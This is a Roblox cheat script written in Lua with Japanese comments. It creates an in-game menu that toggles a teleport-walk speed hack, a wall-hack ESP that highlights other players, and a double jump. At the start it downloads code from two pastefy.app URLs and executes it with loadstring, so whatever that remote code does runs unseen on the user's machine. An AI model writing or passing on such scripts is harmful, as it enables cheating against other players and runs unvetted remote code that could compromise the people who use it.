getgenv().gethui = function() return game.CoreGui end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

-- 前回のloadstringを一度だけ起動
if not getgenv().scriptLoaded1 then
    getgenv().scriptLoaded1 = true
    loadstring(game:HttpGet("https://pastefy.app/Q4euEDHg/raw"))()
end

-- 新しいloadstringも一度だけ、7秒後に起動
if not getgenv().scriptLoaded2 then
    getgenv().scriptLoaded2 = true
    spawn(function()
        wait(7)
        loadstring(game:HttpGet("https://pastefy.app/ixbUds43/raw"))()
    end)
end

-- 7秒後にUI生成（前回フルUIコードのまま）
spawn(function()
    wait(7)

    local function CreateUI()
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "mzUI"
        ScreenGui.ResetOnSpawn = false
        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

        local Frame = Instance.new("Frame")
        Frame.Size = UDim2.new(0, 260, 0, 260)
        Frame.Position = UDim2.new(0.5, -130, 0.5, -130)
        Frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
        Frame.BackgroundTransparency = 0.3
        Frame.AnchorPoint = Vector2.new(0.5,0.5)
        Frame.Parent = ScreenGui

        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(0, 20)
        UICorner.Parent = Frame

        -- レインボーふち
        local Stroke = Instance.new("UIStroke")
        Stroke.Thickness = 4
        Stroke.Parent = Frame
        local hue = 0
        RunService.RenderStepped:Connect(function()
            hue = (hue + 0.5) % 360
            Stroke.Color = Color3.fromHSV(hue/360,1,1)
        end)

        -- ドラッグ処理
        local DragArea = Instance.new("Frame")
        DragArea.Size = UDim2.new(1,0,1,0)
        DragArea.BackgroundTransparency = 1
        DragArea.BorderSizePixel = 0
        DragArea.Parent = Frame

        local dragging, dragInput, dragStart, startPos = false,nil,nil,nil
        local function update(input)
            local delta = input.Position - dragStart
            Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                       startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end

        DragArea.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = Frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)

        DragArea.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                dragInput = input
            end
        end)

        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)

        -- ボタン作成関数
        local function CreateButton(parent, name, yPos)
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(0, 220, 0, 40)
            btn.Position = UDim2.new(0.5, -110, 0, yPos)
            btn.BackgroundColor3 = Color3.fromRGB(128,128,128)
            btn.BackgroundTransparency = 0.6
            btn.TextColor3 = Color3.fromRGB(0,0,0)
            btn.Text = name..": OFF"
            btn.Parent = parent
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0,15)
            corner.Parent = btn
            return btn
        end

        return Frame, CreateButton
    end

    -- UI作成
    local Frame, CreateButton = CreateUI()
    local hideCheatBtn = CreateButton(Frame,"Hide Cheat Walk", 10)
    local nahSpeedBtn = CreateButton(Frame,"Nah Speed", 60)
    local espBtn = CreateButton(Frame,"ESP", 110)
    local doubleJumpBtn = CreateButton(Frame,"Double Jump", 160)

    -- 状態管理
    local tpWalkEnabled = false
    local tpWalkSpeed = 1.2
    local currentMode = nil

    local espEnabled = false
    local highlights = {}

    local doubleJumpEnabled = false
    local canDoubleJump = false

    local function getChar()
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoid = char:WaitForChild("Humanoid")
        local hrp = char:WaitForChild("HumanoidRootPart")
        return char, humanoid, hrp
    end

    local Character, Humanoid, HumanoidRootPart = getChar()

    -- TP Walk
    hideCheatBtn.MouseButton1Click:Connect(function()
        if currentMode=="hide" then
            tpWalkEnabled = false
            currentMode = nil
        else
            tpWalkEnabled = true
            tpWalkSpeed = 1.2
            currentMode = "hide"
        end
        hideCheatBtn.Text = "Hide Cheat Walk: "..(currentMode=="hide" and "ON" or "OFF")
        nahSpeedBtn.Text = "Nah Speed: "..(currentMode=="nah" and "ON" or "OFF")
    end)

    nahSpeedBtn.MouseButton1Click:Connect(function()
        if currentMode=="nah" then
            tpWalkEnabled = false
            currentMode = nil
        else
            tpWalkEnabled = true
            tpWalkSpeed = 1.3
            currentMode = "nah"
        end
        nahSpeedBtn.Text = "Nah Speed: "..(currentMode=="nah" and "ON" or "OFF")
        hideCheatBtn.Text = "Hide Cheat Walk: "..(currentMode=="hide" and "ON" or "OFF")
    end)

    local lastPosition = HumanoidRootPart.Position
    RunService.RenderStepped:Connect(function()
        if tpWalkEnabled then
            local currentPosition = HumanoidRootPart.Position
            local moveDelta = currentPosition - lastPosition
            if moveDelta.Magnitude > 0 then
                HumanoidRootPart.CFrame = CFrame.new(lastPosition + moveDelta*tpWalkSpeed, lastPosition + moveDelta*tpWalkSpeed + HumanoidRootPart.CFrame.LookVector)
            end
            lastPosition = HumanoidRootPart.Position
        else
            lastPosition = HumanoidRootPart.Position
        end
    end)

    -- ESP
    local function removeHighlightForPlayer(player)
        if highlights[player] then
            for _, hl in pairs(highlights[player]) do
                hl:Destroy()
            end
            highlights[player] = nil
        end
    end

    local function createHighlightForPlayer(player)
        removeHighlightForPlayer(player)
        if not espEnabled then return end
        if player == LocalPlayer then return end
        if not player.Character then return end

        local character = player.Character
        local hlList = {}
        for _, part in pairs(character:GetChildren()) do
            if part:IsA("BasePart") then
                local hl = Instance.new("Highlight")
                hl.Adornee = part
                hl.FillColor = Color3.fromRGB(255,0,0)
                hl.FillTransparency = 0.5
                hl.OutlineColor = Color3.fromRGB(255,255,255)
                hl.OutlineTransparency = 0
                hl.Enabled = true
                hl.Parent = getgenv().gethui()
                table.insert(hlList, hl)
            end
        end
        highlights[player] = hlList
    end

    espBtn.MouseButton1Click:Connect(function()
        espEnabled = not espEnabled
        espBtn.Text = "ESP: "..(espEnabled and "ON" or "OFF")
        if not espEnabled then
            for player, _ in pairs(highlights) do
                removeHighlightForPlayer(player)
            end
        else
            for _, player in pairs(Players:GetPlayers()) do
                createHighlightForPlayer(player)
            end
        end
    end)

    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then createHighlightForPlayer(player) end
        player.CharacterAdded:Connect(function()
            createHighlightForPlayer(player)
        end)
    end

    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function()
            createHighlightForPlayer(player)
        end)
    end)

    Players.PlayerRemoving:Connect(removeHighlightForPlayer)

    -- ダブルジャンプ
    doubleJumpBtn.MouseButton1Click:Connect(function()
        doubleJumpEnabled = not doubleJumpEnabled
        doubleJumpBtn.Text = "Double Jump: "..(doubleJumpEnabled and "ON" or "OFF")
    end)

    Humanoid.StateChanged:Connect(function(_, newState)
        if newState == Enum.HumanoidStateType.Landed then
            canDoubleJump = true
        end
    end)

    UserInputService.InputBegan:Connect(function(input, gpe)
        if gpe then return end
        if doubleJumpEnabled and input.KeyCode == Enum.KeyCode.Space then
            if Humanoid:GetState() ~= Enum.HumanoidStateType.Freefall and Humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
                return
            end
            if canDoubleJump then
                Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                HumanoidRootPart.Velocity = Vector3.new(HumanoidRootPart.Velocity.X, 10, HumanoidRootPart.Velocity.Z)
                canDoubleJump = false
            end
        end
    end)
end)
